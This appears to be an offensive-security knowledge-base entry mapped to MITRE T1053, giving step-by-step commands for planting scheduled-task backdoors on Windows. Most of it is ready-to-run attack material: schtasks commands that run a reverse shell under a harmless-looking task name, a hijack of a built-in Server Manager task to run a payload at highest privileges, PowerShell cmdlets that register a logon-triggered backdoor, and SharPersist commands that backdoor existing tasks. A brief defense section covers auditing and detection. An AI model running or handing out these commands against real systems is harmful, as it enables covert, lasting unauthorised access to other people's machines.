---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Scheduled Task|T1053 - Scheduled Task]]'
sub_techniques: []
tags:
  - '[[tags/Scheduled Tasks User]]'
  - '[[tags/Simple User]]'
  - '[[tags/Windows - Persistence]]'
  - persistence
  - scheduled-task
  - backdoor
commands:
  - '[[commands/schtasks-create-task-once]]'
  - '[[commands/schtasks-run-task]]'
  - '[[commands/schtasks-change-task-payload]]'
  - '[[commands/powershell-new-scheduledtaskaction-cmd]]'
  - '[[commands/powershell-new-scheduledtasktrigger-logon]]'
  - '[[commands/powershell-new-scheduledtaskprincipal-user]]'
  - '[[commands/powershell-new-scheduledtasksettingsset]]'
  - '[[commands/powershell-new-scheduledtask-object]]'
  - '[[commands/powershell-register-scheduledtask]]'
  - '[[commands/sharpersist-add-schtaskbackdoor]]'
  - '[[commands/sharpersist-add-new-schtask]]'
  - '[[commands/sharpersist-add-new-schtask-hourly]]'
tools:
  - '[[tools/SharPersist]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Create-Scheduled-Task-Backdoor-for-Persistence

## Summary

This procedure demonstrates how to establish persistence on a Windows system by creating or modifying scheduled tasks to execute a backdoor payload. It covers native methods using schtasks.exe and PowerShell cmdlets, as well as using the SharPersist tool for advanced task manipulation. The backdoor can be triggered at specific times, logon events, or intervals to ensure continued access post-reboot or disruption.

## Description

Scheduled tasks provide a reliable mechanism for persistence in Windows environments, allowing attackers to execute arbitrary code under system or user privileges. This procedure targets domain-joined or standalone Windows hosts where the attacker has local administrative access or equivalent privileges. By leveraging built-in tools like schtasks and PowerShell, or third-party utilities like SharPersist, the attacker can create tasks that run malicious executables (e.g., reverse shells or implants) disguised as legitimate system processes. Success ensures the backdoor executes reliably, evading basic detection if named appropriately. This maps to MITRE ATT&CK technique T1053 for scheduled task abuse, commonly used in post-exploitation for maintaining access.

## Requirements

1. Local administrative privileges on the target Windows system (or SeCreateTaskPrivilege for task creation).
2. Presence of a backdoor executable or script (e.g., revshell.exe) uploaded to a writable path like C:\Temp or %APPDATA%.
3. PowerShell execution policy allowing script runs (bypass if needed with -ExecutionPolicy Bypass).
4. For SharPersist: The tool must be downloaded and executed on the target (e.g., via Invoke-WebRequest).
5. Windows 7 or later (Server 2008 R2+ for full cmdlet support).

## Defense

- Regularly audit scheduled tasks using Task Scheduler GUI or PowerShell (Get-ScheduledTask) for anomalous entries, unusual triggers, or paths pointing to non-standard executables.
- Implement Group Policy to restrict task creation (e.g., deny SeCreateTaskPrivilege to non-admins) and enable Windows Event Logging for Task Scheduler (Event ID 4698 for task creation).
- Use EDR solutions to monitor schtasks.exe and PowerShell invocations for suspicious arguments (e.g., /create with external paths) and block unsigned executables in task actions.
- Apply AppLocker or WDAC to prevent execution of custom payloads in scheduled tasks.

## Objectives

1. Create a new scheduled task that executes a backdoor at a specified time or event to establish persistence.
2. Modify existing system tasks to inject backdoor execution without creating new entries.
3. Ensure the task runs with elevated privileges and survives reboots for long-term access.
4. Validate task creation and immediate execution to confirm backdoor activation.

## Instructions

### Step 1: Create and Run a Basic Scheduled Task Using schtasks

**Context**: Use the native schtasks utility to create a one-time task that runs a backdoor executable immediately or at a set time. This method is stealthy as it mimics legitimate maintenance tasks.

**Command** ([[commands/schtasks-create-task-once]]):
```bash
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
```

> This creates a task named "Device-Synchronize" to run revshell.exe once at midnight. Expected output: "SUCCESS: The scheduled task \"Device-Synchronize\" has successfully been created."

**Command** ([[commands/schtasks-run-task]]):
```bash
schtasks /run /tn "Device-Synchronize"
```

> Forces immediate execution. Expected output: "SUCCESS: Attempted to run the scheduled task \"Device-Synchronize\"."

For a full script example, see [[codes/Create-and-Run-Scheduled-Task-with-schtasks]].

**Expected Output**: Task listed in Task Scheduler; backdoor connects back if it's a reverse shell.

### Step 2: Modify an Existing Task to Execute a Payload Using schtasks

**Context**: Hijack a legitimate system task (e.g., performance monitor) to run the backdoor via rundll32.exe indirection, reducing detection risk by avoiding new task creation.

**Command** ([[commands/schtasks-change-task-payload]]):
```bash
schtasks /change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /tr "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
```

> Changes the task to execute msiexec.exe (replace with backdoor path) at highest privileges. Expected output: "SUCCESS: The scheduled task \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" has successfully been updated."

For a full script example, see [[codes/Modify-Scheduled-Task-to-Execute-Payload]].

**Expected Output**: Task modified; execution triggers payload without errors in event logs.

### Step 3: Create a Logon-Triggered Task Using PowerShell Cmdlets

**Context**: Build and register a custom task using PowerShell for more granular control, such as user-specific triggers and principals. This is ideal for user-level persistence.

**Command** ([[commands/powershell-new-scheduledtaskaction-cmd]]):
```powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
```

> Defines the action to run the backdoor via cmd.exe. Expected output: TaskAction object created.

**Command** ([[commands/powershell-new-scheduledtasktrigger-logon]]):
```powershell
$T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
```

> Sets trigger for user logon. Expected output: TaskTrigger object.

**Command** ([[commands/powershell-new-scheduledtaskprincipal-user]]):
```powershell
$P = New-ScheduledTaskPrincipal "Rasta"
```

> Specifies principal (user context). Expected output: TaskPrincipal object.

**Command** ([[commands/powershell-new-scheduledtasksettingsset]]):
```powershell
$S = New-ScheduledTaskSettingsSet
```

> Default settings (allow demand start, etc.). Expected output: TaskSettings object.

**Command** ([[commands/powershell-new-scheduledtask-object]]):
```powershell
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
```

> Assembles the task object. Expected output: ScheduledTask object.

**Command** ([[commands/powershell-register-scheduledtask]]):
```powershell
Register-ScheduledTask Backdoor -InputObject $D
```

> Registers the task. Expected output: Task registered successfully.

For the complete sequence, see [[codes/PowerShell-Create-Scheduled-Task-at-Logon]].

**Expected Output**: Task appears in Task Scheduler under user triggers; executes on logon.

### Step 4: Add or Update Tasks Using SharPersist Tool

**Context**: Use the SharPersist persistence toolkit to add backdoors to existing tasks or create new ones with options like hourly execution. Requires downloading SharPersist.exe to the target.

First, ensure [[tools/SharPersist]] is available (e.g., via IWR from GitHub).

**Command** ([[commands/sharpersist-add-schtaskbackdoor]]):
```powershell
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

> Adds to an existing task (replace calc.exe with backdoor). Expected output: Task modified.

**Command** ([[commands/sharpersist-add-new-schtask]]):
```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
```

> Creates a new basic task.

**Command** ([[commands/sharpersist-add-new-schtask-hourly]]):
```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

> Creates a new hourly task.

For examples, see [[codes/SharPersist-Add-Scheduled-Task]].

**Expected Output**: Tasks created/updated; verifiable via Get-ScheduledTask.
